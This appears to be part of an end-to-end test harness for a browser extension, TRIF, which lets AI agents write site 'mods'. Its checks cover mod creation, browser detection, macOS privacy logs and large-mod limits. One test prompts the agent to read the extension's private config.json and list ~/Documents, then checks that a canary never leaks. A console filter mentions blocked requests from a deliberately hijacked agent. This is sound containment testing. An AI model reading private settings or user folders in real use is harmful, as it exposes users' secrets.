          || 'no OpenRouter key saved: save one in the side panel\'s settings, or run `trif agent open-model --provider openrouter --set-key`, then run --oss again');
        return;
      }
    }

    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.win.tabId, `${base}/?e2e=agent-${agent}`]);
    await this.waitPage('the test page for the agent', (x) => x.url.includes(`agent-${agent}`) && x.banner === 'ran');
    await this.waitPanel('the panel on 127.0.0.1', (x) => x.site === '127.0.0.1' && !x.gate);
    const tabs = (await this.cli(['tabs'], { json: true })).json || [];
    const tab = tabs.find((t) => t.url.includes(`agent-${agent}`));
    if (!tab) { r.record(`${name}: find the test tab`, 'fail', JSON.stringify(tabs)); return; }

    const chatKey = 'chat:127.0.0.1';
    const chat = () => this.ext(`async (k) => (await chrome.storage.local.get(k))[k] || null`, [chatKey]);
    const send = async (text) => {
      await this.panel(`async (text) => { const i = document.getElementById('input'); i.value = text; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [text]);
      await d.click(this.panelCtx, '#send');
    };

    if (agent === 'claude') {
      await r.check(`${name}: panel chat run makes a mod (model ${model})`, async () => {
        await this.ext(`async (agent) => { const { sitePicks = {} } = await chrome.storage.local.get('sitePicks'); sitePicks['127.0.0.1'] = { agent, models: {} }; await chrome.storage.local.set({ sitePicks }); }`, [agent]);
        await send(`/model ${model}`);
        await sleep(1000);
        const before = new Set(fs.readdirSync(sitesDir));
        const n0 = ((await chat()) || { messages: [] }).messages.length;
        await send('Add a mod for this site that shows a bright yellow banner at the very top of the page reading exactly: Hello from the agent. Keep it small.');
        await sleep(2000);
        await this.shot(this.panelCtx, `panel-${agent}-working`);
        const c = await waitFor('the panel run to finish', async () => {
          const x = await chat();
          return x && !x.run && x.messages.length > n0 + 1 ? x : null;
        }, { timeoutMs: 6 * 60000, intervalMs: 2000 });
        await this.shot(this.panelCtx, `panel-${agent}-done`);
        r.log(`chat: ${JSON.stringify(c.messages.slice(n0), null, 2)}`);
        const errors = c.messages.slice(n0).filter((m) => m.role === 'error');
        const added = fs.readdirSync(sitesDir).filter((f) => !before.has(f) && f.endsWith('.js'));
        if (!added.length) throw new Error(`no new mod in sites/127.0.0.1 (chat: ${c.messages.slice(n0).map((m) => `${m.role}: ${String(m.text).slice(0, 200)}`).join(' | ')})`);
        await this.cli(['reload', '--url', 'agent-claude']);
        await this.waitPage('the agent\'s banner on the page', (x) => /Hello from the agent/i.test(x.text), 30000);
        await this.shot(this.pageCtx, `page-${agent}-mod`);
        return `${added.join(', ')}${errors.length ? `; errors in chat: ${errors.map((e) => e.text).join(' | ')}` : ''}`;
      });
    } else {
      await r.check(`${name}: trif agent run makes a mod${model ? ` (model ${model})` : ''}`, async () => {
        // The harness's own mod also rewrites #target; off for this check, so the order the two run in
        // (alphabetical by file name) doesn't decide it.
        await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
        const before = new Set(fs.readdirSync(sitesDir));
        const out = await this.cli(['agent', 'run', '--agent', agentId, '--tab', String(tab.id), ...(model ? ['--model', model] : []),
          'Add a mod for this site that makes the paragraph with id "target" have a thick red border and the text: Codex was here.'], { timeoutMs: 8 * 60000 });
        r.log(`codex run:\n${out.stdout}\n${out.stderr}`);
        const added = fs.readdirSync(sitesDir).filter((f) => !before.has(f) && f.endsWith('.js'));
        if (!added.length) throw new Error(`no new mod (exit ${out.status}): ${(out.stdout + out.stderr).slice(-600)}`);
        await this.cli(['reload', '--url', `agent-${agent}`]);
        await this.waitPage('Codex\'s change on the page', (x) => /Codex was here/i.test(x.target || ''), 30000);
        await this.shot(this.pageCtx, `page-${agent}-mod`);
        await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
        return added.join(', ');
      });
    }

    await r.check(`${name}: knows which browser it's in`, async () => {
      const out = await this.cli(['agent', 'run', '--agent', agentId, '--tab', String(tab.id), ...(model ? ['--model', model] : []),
        'Which web browser is this tab in? Find out with trif if you need to, then answer with just the browser\'s name.'], { timeoutMs: 6 * 60000 });
      r.log(`browser question:\n${out.stdout}\n${out.stderr}`);
      const text = out.stdout.replace(/^session:.*$/m, '');
      if (!new RegExp(d.name, 'i').test(text)) throw new Error(`answer doesn't name ${d.name}: ${text.trim().slice(-400)}`);
      const wrong = d.name === 'Firefox' ? /\bChrome\b(?! ?extension)/ : /\bFirefox\b/;
      return wrong.test(text) ? { status: 'warn', detail: `names ${d.name} but also the other browser: ${text.trim().slice(-300)}` } : `answered ${d.name}`;
    });

    await r.check(`${name}: can't read TRIF's settings (the private folder) or ~/Documents`, async () => {
      const cfg = path.join(fs.realpathSync(this.priv), 'config.json');
      const out = await this.cli(['agent', 'run', '--agent', agentId, '--tab', String(tab.id), ...(model ? ['--model', model] : []),
        `This is a sandbox test. Using your tools, try to (1) print the contents of ${cfg} and (2) list the files in ~/Documents. Report exactly what each attempt returned, including error messages. Don't try to work around a refusal.`], { timeoutMs: 6 * 60000 });
      r.log(`privacy probe:\n${out.stdout}\n${out.stderr}`);
      const text = out.stdout + out.stderr;
      if (text.includes(this.canary)) throw new Error('the agent read config.json (the canary is in its answer)');
      const runs = path.join(this.priv, 'runs');
      const newest = fs.readdirSync(runs).filter((f) => f.endsWith('.jsonl')).map((f) => path.join(runs, f)).sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs)[0];
      const raw = newest ? fs.readFileSync(newest, 'utf8') : '';
      if (raw.includes(this.canary)) throw new Error(`the canary is in the run's raw output (${newest})`);
      const blocked = /Operation not permitted|not permitted|denied|permission|EPERM|blocked|sandbox/i.test(text + raw);
      const reply = text.replace(/^session:.*$/m, '').trim().split('\n').slice(-6).join(' ').slice(0, 400);
      return blocked ? `refused; reply: ${reply}` : { status: 'warn', detail: `canary not leaked, but no refusal seen; reply: ${reply}` };
    });

    await r.check(`${name}: macOS privacy (TCC) requests during the runs`, async () => {
      const tcc = this.tccLog(tccStart);
      fs.writeFileSync(this.r.file(`${this.label}-tcc-${agent}.txt`), tcc.raw);
      if (tcc.error) return { status: 'warn', detail: `couldn't read the TCC log: ${tcc.error}` };
      if (!tcc.requests.length) return 'none from the helper, its agents, codex or rg';
      // Folder-level privacy services (Documents, Desktop, Downloads…) are what can put a dialog on screen;
      // DeveloperTool and sandboxd's silent Full Disk Access check (Denied (Service Policy)) can't.
      const asked = tcc.requests.filter((q) => /Folder|Volumes|Downloads|Desktop|User Consent/.test(q));
      const detail = `${tcc.requests.length} decision(s):\n${tcc.requests.join('\n')}`;
      return asked.length ? { status: 'warn', detail } : { status: 'pass', detail };
    });
  }

  /**
   * TCC (macOS privacy) decisions since `start` for the helper and what it started (the agents count
   * as the helper's: it's their "responsible" process), and anything codex or rg asked for. Returns
   * {requests: ["<service>: <result> (<subject>)"], raw}. sandboxd's silent checks show up here too.
   */
  tccLog(start) {
    const fmt = (t) => {
      const p = (n) => String(n).padStart(2, '0');
      return `${t.getFullYear()}-${p(t.getMonth() + 1)}-${p(t.getDate())} ${p(t.getHours())}:${p(t.getMinutes())}:${p(t.getSeconds())}`;
    };
    const r = run('/usr/bin/log', ['show', '--info', '--predicate', 'subsystem == "com.apple.TCC"', '--start', fmt(start)], { timeoutMs: 180000 });
    if (r.status !== 0) return { error: (r.stderr || '').trim() || `exit ${r.status}`, raw: r.stdout + r.stderr, requests: [] };
    const lines = r.stdout.split('\n').filter((l) => l.includes('Handling access request to '));
    const ours = lines.filter((l) => l.includes(`pid=${this.helperPid},`) || /\b(codex|codex-path\/rg)\b/.test(l));
    const requests = [...new Set(ours.map((l) => {
      const m = /Handling access request to (\w+), from Sub:\{([^}]*)\}.*?Auth Right: ([^,]*?)\s*,/.exec(l);
      return m ? `${m[1]}: ${m[3]} (from ${m[2]})` : l.slice(l.indexOf('Handling')).slice(0, 300);
    }))];
    return { raw: ours.join('\n') + '\n', requests };
  }

  async consoleCheck() {
    // The helper stopped and user scripts turned off on purpose (colourChecks): the background's warnings
    // about either are expected.
    const expected = (p) => p.level === 'warn' && ((this.helperStopped && /helper disconnected|native messaging host/i.test(String(p.text)))
      || (this.scriptsRevoked && /user scripts were turned off/.test(String(p.text))))
      // the hijacked agent's requests, which the tab lock blocked on purpose (hijackedAgentCheck)
      // (Firefox doesn't say which page: after that check, a failed fetch or socket is one of those)
      || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket|e2e-leak|e2e-nav|blocked by|CORS/i.test(String(p.text) + String(p.source || '')));
    const problems = (await this.d.consoleProblems()).filter((p) => !expected(p));
    // The agent-made mod and the stand-in pages aren't ours to judge; everything else counts.
    const lines = problems.map((p) => `${p.level} [${p.from}] ${String(p.text).slice(0, 300)}${p.source ? ` (${String(p.source).slice(0, 120)})` : ''}`);
    fs.writeFileSync(this.r.file(`${this.label}-console.txt`), lines.join('\n') + '\n');
    const errors = problems.filter((p) => p.level === 'error');
    if (errors.length) throw new Error(`${errors.length} error(s), ${problems.length - errors.length} warning(s):\n${lines.slice(0, 15).join('\n')}`);
    if (problems.length) return { status: 'warn', detail: `${problems.length} warning(s):\n${lines.slice(0, 15).join('\n')}` };
    return 'none';
  }

  /**
   * A set just over the 1 MB one native message can carry in Chrome and Firefox: a 1 MB mod (a base64
   * string, like a mod with a sound in it) and 0.4 MB of functions, on the test site, which is on. It goes
   * in parts and runs; a change to the small one goes without the big one's code (modsSame) and the big one
   * still runs; a mod over the 4 MB cap isn't sent and `trif status` and `trif doctor` say why; removed, they
   * go. This stays small on purpose (a 48 MB set once took headless Firefox to 7.4 GB and the Mac ran out of
   * memory): tests/e2e/measure-big-mods.js measures sets up to the 16 MB cap, separately.
   */
  async bigModsCheck() {
    const dir = path.join(this.trif, 'sites', '127.0.0.1');
    const log = path.join(this.priv, 'helper.log');
    const size = () => fs.statSync(log).size;
    const since = (at) => { const b = fs.readFileSync(log); return b.subarray(at).toString('utf8'); };
    const BIG = 1024 * 1024;
    const bigMod = (tag) => {
      const d = crypto.randomBytes(BIG * 3 / 4).toString('base64');
      return `// ==WebMod==\n// @name E2E Big\n// ==/WebMod==\nconst d = "${d}";\ndocument.documentElement.dataset.trifE2eBig = "${tag}:" + d.length;\n`;
    };
    const fns = [];
    for (let i = 0, n = 0; n < 0.4 * 1024 * 1024; i++) { const f = `function f${i}(a) { const x = a * ${i} + ${i % 13}; return x % 7 === 3 ? String(x) + "${crypto.randomBytes(12).toString('hex')}" : x; }\n`; fns.push(f); n += f.length; }
    const codeMod = (tag) => `// ==WebMod==\n// @name E2E Code\n// ==/WebMod==\n${fns.join('')}let s = 0;\n${fns.map((_, i) => `s += String(f${i}(${i})).length;`).join('\n')}\ndocument.documentElement.dataset.trifE2eCode = "${tag}:" + s;\n`;
    const want = String(fns.reduce((n, f, i) => n + String(new Function(`${f}; return f${i}(${i});`)()).length, 0));
    const state = () => this.page(`async () => ({ big: document.documentElement.dataset.trifE2eBig || null, code: document.documentElement.dataset.trifE2eCode || null, huge: document.documentElement.dataset.trifE2eHuge || null, banner: document.documentElement.dataset.trifE2e || null, nav: Math.round(performance.getEntriesByType('navigation')[0]?.domContentLoadedEventEnd || 0) })`);
    const SENT = /sent (\d+) mod\(s\) to the extension(?: \(\d+ held\))?(?: \((\d+) it has already, without their code\))?, (\d+) KB(?: in (\d+) parts)?/;
    // From the write to the extension's modsApplied (its "registered" line in the helper's log).
    const delivered = async (what, write, pred) => {
      const at = size();
      const t0 = Date.now();
      write();
      const text = await waitFor(`the helper to send ${what} and the extension to apply it`, () => {
        const t = since(at);
        const sent = SENT.exec(t);
        return sent && pred({ same: Number(sent[2] || 0), kb: Number(sent[3]), parts: Number(sent[4] || 0) }) && /extension registered \d+ mod\(s\)/.test(t.slice(sent.index)) ? t : null;
      }, { timeoutMs: 30000, intervalMs: 50 });
      const sent = SENT.exec(text);
      return { ms: Date.now() - t0, same: Number(sent[2] || 0), kb: Number(sent[3]), parts: Number(sent[4] || 0) };
    };
    const reload = async (pred) => {
      await this.ext(`async (id) => { await chrome.tabs.reload(id); }`, [this.win.tabId]);
      return waitFor('the test page with the big mods', async () => {
        this.pageCtx = await this.d.findPage((u) => u.startsWith(this.pageUrlPrefix), { timeoutMs: 5000 });
        const s = await state();
        return pred(s) ? s : null;
      }, { timeoutMs: 30000 });
    };
    const files = ['e2e-big.js', 'e2e-code.js', 'e2e-huge.js'].map((f) => path.join(dir, f));
    try {
      const first = await delivered('the big set', () => { fs.writeFileSync(files[0], bigMod('v1')); fs.writeFileSync(files[1], codeMod('v1')); }, (m) => m.parts > 1);
      const p1 = await reload((s) => s.big === `v1:${BIG}` && s.code === `v1:${want}` && s.banner === 'ran');
      // A change to the small one: the big one goes without its code, and still runs.
      const change = await delivered('the changed set', () => fs.writeFileSync(files[1], codeMod('v2')), (m) => m.same >= 1);
      if (change.parts || change.kb > 1024) throw new Error(`a change to the 0.4 MB mod sent ${change.kb} KB${change.parts ? ` in ${change.parts} parts` : ''}`);
      await reload((s) => s.big === `v1:${BIG}` && s.code === `v2:${want}`);
      // Over the cap: not sent, and said why.
      fs.writeFileSync(files[2], `// ==WebMod==\n// @name E2E Huge\n// ==/WebMod==\n/*${'x'.repeat(4 * 1024 * 1024)}*/\ndocument.documentElement.dataset.trifE2eHuge = "ran";\n`);
      const huge = await waitFor('trif status to say the huge mod was not sent', async () => {
        const st = (await this.cli(['status'], { json: true })).json;
        return (st?.helper?.modErrors || []).find((e) => e.id === '127.0.0.1/e2e-huge') || null;
      }, { timeoutMs: 15000 });
      if (huge.limit !== 'mod' || !/a mod can be up to 4 MB/.test(huge.error)) throw new Error(`huge: ${JSON.stringify(huge)}`);
      const doc = (await this.cli(['doctor'], { json: true, timeoutMs: 60000 })).json;
      const check = (doc?.checks || []).find((c) => /e2e-huge/.test(c.title));
      if (!check || check.status !== 'fail' || !/keep sounds, pictures/.test(check.fix || '')) throw new Error(`trif doctor: ${JSON.stringify(check)}`);
      const p2 = await reload((s) => s.big === `v1:${BIG}` && s.code === `v2:${want}`);
      if (p2.huge) throw new Error('the mod over the cap ran');
      const status = (await this.cli(['status'], { json: true })).json;
      const errs = [...((status?.helper?.modErrors || []).filter((e) => e.id !== '127.0.0.1/e2e-huge')), ...((status?.helper?.modsApplied || {}).errors || [])].filter((e) => /e2e-(big|code)/.test(e.id));
      if (errs.length) throw new Error(`errors: ${JSON.stringify(errs).slice(0, 300)}`);
      const gone = await delivered('the set without them', () => files.forEach((f) => fs.rmSync(f, { force: true })), (m) => !m.parts);
      await reload((s) => !s.big && !s.code && s.banner === 'ran');
      return `${first.kb} KB in ${first.parts} parts, applied ${first.ms} ms after the write, page DOMContentLoaded ${p1.nav} ms; a change to the small mod: ${change.kb} KB (${change.same} sent without code), ${change.ms} ms; over 4 MB: not sent ("${huge.error.slice(0, 60)}…"); removed: ${gone.ms} ms`;
    } finally {
      for (const f of files) fs.rmSync(f, { force: true });
    }
  }

  async helperLogCheck() {
    const file = path.join(this.priv, 'helper.log');
    if (!fs.existsSync(file)) return { status: 'skip', detail: 'no helper.log' };
    const lines = fs.readFileSync(file, 'utf8').split('\n');
    fs.copyFileSync(file, this.r.file(`${this.label}-helper.log`));
    // Before the harness allows user scripts, every sync logs that each mod couldn't register: expected.
    const expected = (l) => /User scripts aren't allowed for TRIF|User scripts are off for TRIF/.test(l) // Firefox's wording, Chrome's
      || (this.scriptsRevoked && /user scripts were turned off/.test(l)) // colourChecks turned them off
      || /mod 127\.0\.0\.1\/e2e-huge: mod is [\d.]+ MB; a mod can be up to 4 MB/.test(l) // bigModsCheck's, over the cap on purpose
      || /WARN stdout error \(EPIPE\); \w+ went away/.test(l); // (the harness quit the browser while the helper was writing to it)
    const skipped = lines.filter(expected).length;
    const bad = lines.filter((l) => !expected(l) && /\b(WARN|ERROR|warn|error)\b/.test(l.slice(0, 60)));
    const errors = bad.filter((l) => /\bERROR\b|\berror\b/.test(l.slice(0, 60)));
    if (errors.length) throw new Error(`${errors.length} error line(s):\n${errors.slice(0, 10).join('\n')}`);
    if (bad.length) return { status: 'warn', detail: `${bad.length} warning line(s):\n${bad.slice(0, 10).join('\n')}` };
    return `${lines.length} lines, none at warn/error${skipped ? ` (besides ${skipped} "user scripts aren't allowed" lines from before the harness allowed them)` : ''}`;
  }
}

module.exports = { Scenario, REAL_HOME };
